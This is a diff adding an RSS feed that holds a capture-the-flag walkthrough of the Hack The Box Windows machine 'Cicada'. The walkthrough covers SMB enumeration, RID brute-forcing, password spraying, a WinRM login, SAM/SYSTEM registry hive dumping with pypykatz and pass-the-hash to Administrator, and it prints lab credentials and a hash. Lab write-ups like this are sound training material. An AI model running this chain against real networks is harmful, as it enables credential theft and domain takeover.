@@ -1,0 +1,123 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Cicada]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>Cicada</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sun, 16 Feb 2025 06:54:31 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sun, 16 Feb 2025 06:54:31 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Cicada]]></title><description><![CDATA[ 
+ <br><img alt="Cicada.png" src="cicada.png"><br><a rel="noopener nofollow" class="external-link" href="https://app.hackthebox.com/machines/Cicada" target="_blank">https://app.hackthebox.com/machines/Cicada</a><br>IP Address: 10.10.11.35<br>
+OS: Windows<br>
+Difficulty: Easy<br><br>First, let's perform a Nmap scan against the target system.<br>sudo nmap -sC -sV -vv -T5 10.10.11.35 -oA Nmap/Cicada.nmap
+<br>and we get the following output:<br>Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-18 21:38:06Z)
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-08-22T20:24:16
+| Not valid after:  2025-08-22T20:24:16
+| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
+| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
+| -----BEGIN CERTIFICATE-----
+
+...................................
+...................................
+
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+464/tcp  open  kpasswd5?     syn-ack ttl 127
+593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-08-22T20:24:16
+| Not valid after:  2025-08-22T20:24:16
+| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
+| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
+| -----BEGIN CERTIFICATE-----
+
+...................................
+...................................
+
+|_ssl-date: TLS randomness does not represent time
+3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-08-22T20:24:16
+| Not valid after:  2025-08-22T20:24:16
+| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
+| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
+| -----BEGIN CERTIFICATE-----
+
+...................................
+...................................
+
+|_ssl-date: TLS randomness does not represent time
+3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-08-22T20:24:16
+| Not valid after:  2025-08-22T20:24:16
+| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
+| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
+| -----BEGIN CERTIFICATE-----
+
+...................................
+...................................
+
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 7h00m00s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 43674/tcp): CLEAN (Timeout)
+|   Check 2 (port 19434/tcp): CLEAN (Timeout)
+|   Check 3 (port 62917/udp): CLEAN (Timeout)
+|   Check 4 (port 25229/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2025-01-18T21:38:51
+|_  start_date: N/A
+
+<br><br>We see that we have many ports open in this machine, seems to be a part of an active directory windows server. Therefor, let's try with the SMB Share first.<br>smbclient -L //10.10.11.35 -U 'anonymous'
+<br><img alt="Pasted image 20250118201655.png" src="pasted-image-20250118201655.png"><br>Here we see a file called as HR, which looks interesting to find out. So, let's try to access the contents present in the HR file by connecting to the file share<br>smbclient //10.10.11.35/HR -U "anonymous"
+<br><img alt="Pasted image 20250118202202.png" src="pasted-image-20250118202202.png"><br>We find a file called Notice from HR.txt which might have some useful contents for us to exploit, therefor, let's download the file and then read the contents of it<br>get "Notice from HR.txt"
+<br><img alt="Pasted image 20250118202518.png" src="pasted-image-20250118202518.png"><br>We find a password in the contents of the file of a user present in the server: Cicada$M6Corpb*@Lp#nZp!8<br>Let's now try to get the list of usernames/ users present in the server:<br>crackmapexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute
+<br><img alt="Pasted image 20250118204407.png" src="pasted-image-20250118204407.png"><br>Let's add the SidTypeUser tagged usernames into a file.<br><img alt="Pasted image 20250118204941.png" src="pasted-image-20250118204941.png"><br>Now, let's try the password against these users.<br>nxc smb 10.10.11.35 -u username.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
+<br><img alt="Pasted image 20250118205149.png" src="pasted-image-20250118205149.png"><br>NICE!!!!!! We get a username for this password: michael.wrightson<br>Using this username's let's check for other users who are present in the server.<br>nxc smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
+<br><img alt="Pasted image 20250118205635.png" src="pasted-image-20250118205635.png"><br>Found another user david.orelious with his password shown to us in clear text: 'aRt$Lp#7t*VQ!3'<br>Using this user, let's login to the SMB share to the DEV folder.<br>smbclient //10.10.11.35/DEV -U "david.orelious"
+<br><img alt="Pasted image 20250118210030.png" src="pasted-image-20250118210030.png"><br>Download the Backup_script.ps1 file to your local computer and then look at the file contest of it.<br>get Backup_script.ps1
+<br><img alt="Pasted image 20250118210148.png" src="pasted-image-20250118210148.png"><br>HERE!!!!!!!!!!!!!!!!!! We the new user emily.oscars and his/her password: Q!3@Lp#M6b*7t*Vt<br>Let's enumerate this user using a tool called evil-winrm <br>evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
+<br><img alt="Pasted image 20250118210540.png" src="pasted-image-20250118210540.png"><br>With this we have compromised the user!!! We can find the user flag in the Desktop folder<br><img alt="Pasted image 20250118210748.png" src="pasted-image-20250118210748.png"><br><br>To perform escalation, let's go to the root directory of the system and create a folder for us to copy some of the registry files onto the folder.<br>mkdir Temp1
+<br>Now, save the files to this folder:<br>reg save hklm\sam C:\Temp1\sam
+<br>reg save hklm\system C:\Temp1\system
+<br><img alt="Pasted image 20250118211538.png" src="pasted-image-20250118211538.png"><br>Once you save the registry files, download the files to your local system:<br>download sam
+<br>download system
+<br><img alt="Pasted image 20250118212741.png" src="pasted-image-20250118212741.png"><br>Once the files are downloaded into the system, open another terminal and then generate the registry hash of the Administrator user.<br>pypykatz registry --sam sam system
+<br><img alt="Pasted image 20250118212958.png" src="pasted-image-20250118212958.png"><br>evil-winrm -i 10.10.11.35 -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
+<br><img alt="Pasted image 20250118213422.png" src="pasted-image-20250118213422.png"><br>Now the root flag is in the Administrator's Desktop!<br><br><br>Instagram: <a data-tooltip-position="top" aria-label="https://www.instagram.com/pranava__rao/" rel="noopener nofollow" class="external-link" href="https://www.instagram.com/pranava__rao/" target="_blank">@Pranava__Rao</a><br>
+Linked: <a data-tooltip-position="top" aria-label="https://in.linkedin.com/in/pranava-rao" rel="noopener nofollow" class="external-link" href="https://in.linkedin.com/in/pranava-rao" target="_blank">Pranava Rao</a><br>
+X: <a data-tooltip-position="top" aria-label="https://x.com/Pranava__Rao" rel="noopener nofollow" class="external-link" href="https://x.com/Pranava__Rao" target="_blank">@Pranava__Rao</a><br>
+GitHub: <a data-tooltip-position="top" aria-label="https://github.com/Rao-Pranava" rel="noopener nofollow" class="external-link" href="https://github.com/Rao-Pranava" target="_blank">Pranava Rao</a><br>
+YouTube: <a data-tooltip-position="top" aria-label="https://www.youtube.com/@pranava__rao" rel="noopener nofollow" class="external-link" href="https://www.youtube.com/@pranava__rao" target="_blank">@Pranava__Rao</a>]]></description><link>cicada.html</link><guid isPermaLink="false">Cicada.md</guid><pubDate>Sun, 16 Feb 2025 06:52:39 GMT</pubDate><enclosure url="cicada.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;cicada.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
